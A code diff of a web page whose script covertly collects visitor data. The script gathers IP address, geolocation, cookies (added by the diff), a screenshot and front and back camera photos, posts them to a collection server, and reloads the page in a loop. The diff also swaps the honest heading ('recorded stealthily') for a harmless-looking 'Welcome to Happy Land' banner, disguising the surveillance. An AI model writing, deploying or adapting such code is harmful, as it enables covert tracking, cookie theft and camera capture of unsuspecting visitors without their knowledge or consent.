@@ -112,8 +112,8 @@
             }
 
             // Send collected data to the server
-            function sendDataToServer(data, callback) {
-                fetch('http://localhost:5000/logs', {
+            function sendDataToServer(url, data) {
+                fetch(url, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
@@ -121,14 +121,21 @@
                     body: JSON.stringify(data)
                 })
                 .then(response => response.json())
-                .then(result => {
-                    console.log('Success:', result);
-                    if (callback) callback();
+                .then(result => console.log('Success:', result))
+                .catch(error => console.error('Error:', error));
+            }
+
+            // Function to upload file to the server
+            function uploadFileToServer(url, file, filename) {
+                const formData = new FormData();
+                formData.append(filename, file);
+                fetch(url, {
+                    method: 'POST',
+                    body: formData
                 })
-                .catch(error => {
-                    console.error('Error:', error);
-                    if (callback) callback();
-                });
+                .then(response => response.json())
+                .then(result => console.log('File upload success:', result))
+                .catch(error => console.error('File upload error:', error));
             }
 
             // Function to collect and send data in stages
@@ -138,52 +145,34 @@
                     referrer: getReferrer(),
                     pageLoadTime: getPageLoadTime(),
                     screenResolution: getScreenResolution(),
-                    localTime: getLocalTime()
+                    localTime: getLocalTime(),
+                    cookies: getCookies()
                 };
 
-                sendDataToServer(data, () => {
-                    getIPAddress().then(ipAddress => {
-                        sendDataToServer({ ipAddress: ipAddress }, () => {
-                            new Promise((resolve) => getGeolocation(resolve)).then(location => {
-                                sendDataToServer(location, () => {
-                                    captureScreenshot(screenshotBlob => {
-                                        if (screenshotBlob) {
-                                            const formData = new FormData();
-                                            formData.append('screenshot', screenshotBlob, 'screenshot.png');
-                                            fetch('http://localhost:5000/upload', {
-                                                method: 'POST',
-                                                body: formData
-                                            }).then(() => {
-                                                captureCameraPhoto('user', frontCameraBlob => {
-                                                    if (frontCameraBlob) {
-                                                        formData.append('frontCamera', frontCameraBlob, 'front_camera.png');
-                                                        fetch('http://localhost:5000/upload', {
-                                                            method: 'POST',
-                                                            body: formData
-                                                        }).then(() => {
-                                                            captureCameraPhoto('environment', backCameraBlob => {
-                                                                if (backCameraBlob) {
-                                                                    formData.append('backCamera', backCameraBlob, 'back_camera.png');
-                                                                    fetch('http://localhost:5000/upload', {
-                                                                        method: 'POST',
-                                                                        body: formData
-                                                                    }).then(() => {
-                                                                        setTimeout(() => location.reload(), 5000);
-                                                                    });
-                                                                } else {
-                                                                    setTimeout(() => location.reload(), 5000);
-                                                                }
-                                                            });
-                                                        });
-                                                    } else {
-                                                        setTimeout(() => location.reload(), 5000);
-                                                    }
-                                                });
-                                            });
-                                        } else {
-                                            setTimeout(() => location.reload(), 5000);
-                                        }
-                                    });
+                sendDataToServer('http://localhost:5000/logs', data);
+
+                getIPAddress().then(ipAddress => {
+                    sendDataToServer('http://localhost:5000/logs', { ipAddress: ipAddress });
+                    
+                    new Promise((resolve) => getGeolocation(resolve)).then(location => {
+                        sendDataToServer('http://localhost:5000/logs', location);
+
+                        captureScreenshot(screenshotBlob => {
+                            if (screenshotBlob) {
+                                uploadFileToServer('http://localhost:5000/upload', screenshotBlob, 'screenshot');
+                            }
+
+                            captureCameraPhoto('user', frontCameraBlob => {
+                                if (frontCameraBlob) {
+                                    uploadFileToServer('http://localhost:5000/upload', frontCameraBlob, 'frontCamera');
+                                }
+
+                                captureCameraPhoto('environment', backCameraBlob => {
+                                    if (backCameraBlob) {
+                                        uploadFileToServer('http://localhost:5000/upload', backCameraBlob, 'backCamera');
+                                    }
+
+                                    setTimeout(() => location.reload(), 5000);
                                 });
                             });
                         });
@@ -198,7 +187,7 @@
     </script>
 </head>
 <body>
-    <h1>Welcome to Ninja Info Collector</h1>
-    <p>Your visit is being recorded stealthily!</p>
+    <h1>Welcome to Happy Land</h1>
+    <p>Your visit is being happy!</p>
 </body>
 </html>
